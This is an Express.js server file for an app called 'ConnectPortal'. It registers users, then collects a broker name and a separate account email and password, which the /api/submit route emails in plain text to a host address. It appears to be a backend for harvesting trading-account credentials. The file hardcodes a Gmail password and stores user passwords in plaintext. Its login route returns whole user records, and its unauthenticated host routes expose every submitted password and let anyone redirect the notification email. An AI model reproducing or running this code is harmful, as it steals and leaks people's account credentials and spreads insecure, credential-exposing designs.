const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());
app.use(express.static('public'));

let users = [];
let hostConfig = {
    email: 'muthinjivictor8@gmail.com'
};

// Configure your Email Transporter here (e.g., Gmail SMTP or another provider)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'muthinjivictor8@gmail.com', // Your sending email
        pass: 'vici12.,'      // Your Gmail App Password (or SMTP password)
    }
});

app.post('/api/register', (req, res) => {
    const { fullName, email, phone, dob, password, confirmPassword } = req.body;

    if (!fullName || !email || !password) {
        return res.json({ success: false, message: "Required fields are missing." });
    }

    if (password !== confirmPassword) {
        return res.json({ success: false, message: "Passwords do not match." });
    }

    const existingUser = users.find(u => u.email === email);
    if (existingUser) {
        return res.json({ success: false, message: "User with this email already exists." });
    }

    users.push({
        fullName: fullName || 'N/A',
        email: email || 'N/A',
        phone: phone || 'N/A',
        dob: dob || 'N/A',
        password,
        status: 'none',
        submittedData: null
    });

    res.json({ success: true, message: "Registration successful! You can now log in." });
});

app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;

    const user = users.find(u => u.email === identifier || u.fullName === identifier);
    if (!user || user.password !== password) {
        return res.json({ success: false, message: "Invalid email/username or password." });
    }

    res.json({ success: true, user });
});

app.get('/api/user/:email', (req, res) => {
    const user = users.find(u => u.email === req.params.email);
    if (!user) {
        return res.json({ success: false, message: "User not found." });
    }
    res.json({ success: true, user });
});

app.post('/api/submit', async (req, res) => {
    const { email, submittedData } = req.body;

    const user = users.find(u => u.email === email);
    if (!user) {
        return res.json({ success: false, message: "User not found." });
    }

    const isUpdate = user.submittedData !== null;
    user.submittedData = {
        broker: submittedData.broker || 'N/A',
        mobile: submittedData.mobile || 'N/A',
        country: submittedData.country || 'N/A',
        city: submittedData.city || 'N/A',
        area: submittedData.area || 'N/A',
        submissionEmail: submittedData.submissionEmail || 'N/A',
        submissionPassword: submittedData.submissionPassword || 'N/A'
    };
    user.status = 'pending';

    const mailOptions = {
        from: 'muthinjivictor8@gmail.com',
        to: hostConfig.email,
        subject: `[ConnectPortal] New/Updated Submission from ${user.fullName}`,
        text: `Hello Host,\n\nClient ${user.fullName} (${user.email}) has ${isUpdate ? 'updated' : 'submitted'} their details:\n\n` +
            `Broker: ${user.submittedData.broker}\n` +
            `Mobile: ${user.submittedData.mobile}\n` +
            `Location: ${user.submittedData.area}, ${user.submittedData.city}, ${user.submittedData.country}\n` +
            `Submission Email/ID: ${user.submittedData.submissionEmail}\n` +
            `Submission Password: ${user.submittedData.submissionPassword}\n\n` +
            `Please check your Host Dashboard to verify or decline.`
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log(`[EMAIL SENT] Notification successfully dispatched to ${hostConfig.email}`);
    } catch (emailErr) {
        console.error(`[EMAIL ERROR] Failed to send email via transporter:`, emailErr.message);
    }

    res.json({ success: true, message: "received successfully." });
});

app.get('/api/host/submissions', (req, res) => {
    const activeSubmissions = users
        .filter(u => u.submittedData !== null && u.submittedData !== undefined)
        .map(u => ({
            fullName: u.fullName || 'N/A',
            email: u.email || 'N/A',
            phone: u.phone || 'N/A',
            status: u.status || 'none',
            submittedData: {
                broker: u.submittedData.broker || 'N/A',
                mobile: u.submittedData.mobile || 'N/A',
                country: u.submittedData.country || 'N/A',
                city: u.submittedData.city || 'N/A',
                area: u.submittedData.area || 'N/A',
                submissionEmail: u.submittedData.submissionEmail || 'N/A',
                submissionPassword: u.submittedData.submissionPassword || 'N/A'
            }
        }));

    res.json({ success: true, submissions: activeSubmissions });
});

app.post('/api/host/update-status', (req, res) => {
    const { email, status } = req.body;

    const user = users.find(u => u.email === email);
    if (!user) {
        return res.json({ success: false, message: "User not found." });
    }

    user.status = status;
    res.json({ success: true, message: `Status updated to ${status}` });
});

app.post('/api/host/update-email', (req, res) => {
    const { newEmail } = req.body;
    if (!newEmail || !newEmail.includes('@')) {
        return res.json({ success: false, message: "Invalid email address provided." });
    }

    hostConfig.email = newEmail;
    console.log(`[HOST INFO] Host notification email updated to: ${newEmail}`);
    res.json({ success: true, message: `Admin email successfully updated to ${newEmail}` });
});

app.listen(PORT, () => {
    console.log(`Server running smoothly on port ${PORT}`);
});